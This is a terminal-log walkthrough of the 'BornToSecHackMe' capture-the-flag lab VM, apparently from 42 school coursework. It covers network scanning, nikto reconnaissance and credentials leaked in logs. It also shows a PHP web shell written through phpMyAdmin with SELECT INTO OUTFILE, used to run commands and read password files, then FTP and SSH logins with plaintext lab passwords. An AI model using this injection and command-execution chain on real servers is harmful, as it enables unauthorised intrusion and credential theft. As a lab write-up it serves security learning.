nagrivan@at-i1 ~ % ifconfig
(...)
	ether 0a:00:27:00:00:00
	inet 192.168.56.1 netmask 0xffffff00 broadcast 192.168.56.255

nagrivan@at-i1 ~ % arp -a
? (192.168.20.1) at 0:a5:bf:d1:67:56 on en0 ifscope [ethernet]
(...)
? (192.168.56.1) at a:0:27:0:0:0 on vboxnet0 ifscope permanent [ethernet]
? (192.168.56.100) at 8:0:27:15:dd:9 on vboxnet0 ifscope [ethernet]
? (192.168.56.102) at 8:0:27:e0:40:f2 on vboxnet0 ifscope [ethernet]
(...)

nagrivan@at-i1 ~ % nmap 192.168.56.102/24
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-08 17:29 MSK
(...)

Nmap scan report for 192.168.56.104
Host is up (0.00032s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (3 hosts up) scanned in 62.83 seconds

nagrivan@at-i1 ~ % ssh 192.168.56.104 -p 22
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
ECDSA key fingerprint is SHA256:d5T03f+nYmKY3NWZAinFBqIMEK1U0if222A1JeR8lYE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.104' (ECDSA) to the list of known hosts.
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
nagrivan@192.168.56.104's password:

nagrivan@at-i1 ~ % curl 192.168.56.104:80
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>Hack me if you can</title>
	<meta name='description' content='Simple and clean HTML coming soon / under construction page'/>
	<meta name='keywords' content='coming soon, html, html5, css3, css, under construction'/>
	<link rel="stylesheet" href="style.css" type="text/css" media="screen, projection" />
	<link href='http://fonts.googleapis.com/css?family=Coustard' rel='stylesheet' type='text/css'>

</head>
<body>
	<div id="wrapper">
		<h1>Hack me</h1>
		<h2>We're Coming Soon</h2>
		<p>We're wetting our shirts to launch the website.<br />
		In the mean time, you can connect with us trought</p>
		<p><a href="https://fr-fr.facebook.com/42Born2Code"><img src="fb.png" alt="Facebook" /></a> <a href="https://plus.google.com/+42Frborn2code"><img src="+.png" alt="Google +" /></a> <a href="https://twitter.com/42born2code"><img src="twitter.png" alt="Twitter" /></a></p>
	</div>
</body>
</html>

; curl 192.168.56.104:443
; <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
; <html><head>
; <title>400 Bad Request</title>
; </head><body>
; <h1>Bad Request</h1>
; <p>Your browser sent a request that this server could not understand.<br />
; Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
; Instead use the HTTPS scheme to access this URL, please.<br />
; <blockquote>Hint: <a href="https://127.0.1.1/"><b>https://127.0.1.1/</b></a></blockquote></p>
; <hr>
; <address>Apache/2.2.22 (Ubuntu) Server at 127.0.1.1 Port 443</address>
; </body></html>

nagrivan@at-i1 ~ % nikto -h http://192.168.56.104
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.104
+ Target Hostname:    192.168.56.104
+ Target Port:        80
+ Start Time:         2022-10-08 17:57:23 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, inode: 13650, size: 1025, mtime: Thu Oct  8 02:37:54 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8346 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-10-08 17:57:32 (GMT3) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

nagrivan@at-i1 ~ % nikto -h https://192.168.56.104
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.104
+ Target Hostname:    192.168.56.104
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=BornToSec
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /CN=BornToSec
+ Start Time:         2022-10-08 17:57:45 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Hostname '192.168.56.104' does not match certificates names: BornToSec
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.20
+ Cookie PHPSESSID created without the secure flag
+ Cookie PHPSESSID created without the httponly flag
+ Cookie mlf2_usersettings created without the secure flag
+ Cookie mlf2_usersettings created without the httponly flag
+ Cookie mlf2_last_visit created without the secure flag
+ Cookie mlf2_last_visit created without the httponly flag
+ OSVDB-3092: /forum/: This might be interesting...
+ Cookie SQMSESSID created without the secure flag
+ Cookie SQMSESSID created without the httponly flag
+ OSVDB-3093: /webmail/src/read_body.php: SquirrelMail found
+ Server leaks inodes via ETags, header found with file /icons/README, inode: 47542, size: 5108, mtime: Tue Aug 28 14:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 8496 requests: 0 error(s) and 23 item(s) reported on remote host
+ End Time:           2022-10-08 17:59:20 (GMT3) (95 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

nagrivan@at-i1 ~ % curl -k https://192.168.56.104/forum
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="https://192.168.56.104/forum/">here</a>.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 192.168.56.104 Port 443</address>
</body></html>

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)

nagrivan@at-i1 ~ % ssh lmezard@192.168.56.104 -p 22
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
lmezard@192.168.56.104s password:
Permission denied, please try again.


Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.

SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'

nagrivan@at-i1 ~ % curl --insecure 'https://192.168.56.104/forum/templates_c/backdoor.php?cmd=ls%20%20/home'
1	LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz

nagrivan@at-i1 ~ % curl --insecure 'https://192.168.56.104/forum/templates_c/backdoor.php?cmd=ls%20/home/LOOKATME'
1	password

nagrivan@at-i1 ~ % curl --insecure 'https://192.168.56.104/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password'
1	lmezard:G!@M6f4Eatau{sF"

        nagrivan@at-i1 ~ % ssh lmezard@192.168.56.104 -p 22
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
lmezard@192.168.56.104's password:
Permission denied, please try again.

nagrivan@at-i1 ~ % ftp 192.168.56.104
Connected to 192.168.56.104.
220 Welcome on this server
Name (192.168.56.104:nagrivan): lmezard
331 Please specify the password.
Password:
230 Login successful.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.

ftp> get README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
96 bytes received in 0.000176 seconds (533 kbytes/s)

ftp> get fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
WARNING! 2764 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
808960 bytes received in 0.0705 seconds (10.9 Mbytes/s)

ftp> quit
221 Goodbye.
nagrivan@at-i1 ~ % cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

nagrivan@at-i1 ~ % cat ft_fun/C4D03.pcap
}void useless() {

//file259%

nagrivan@at-i1 ~ % chmod +x check_to_pcap.py
nagrivan@at-i1 ~ % ./check_to_pcap.py

nagrivan@at-i1 ~ % gcc main.c
nagrivan@at-i1 ~ % ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%

Путем онлайн шифрования по SHA-256 получаем пароль laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

nagrivan@at-i1 ~ % ssh laurie@192.168.56.104 -p 22
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.104's password:

laurie@BornToSecHackMe:~$ ls
bomb  README

laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).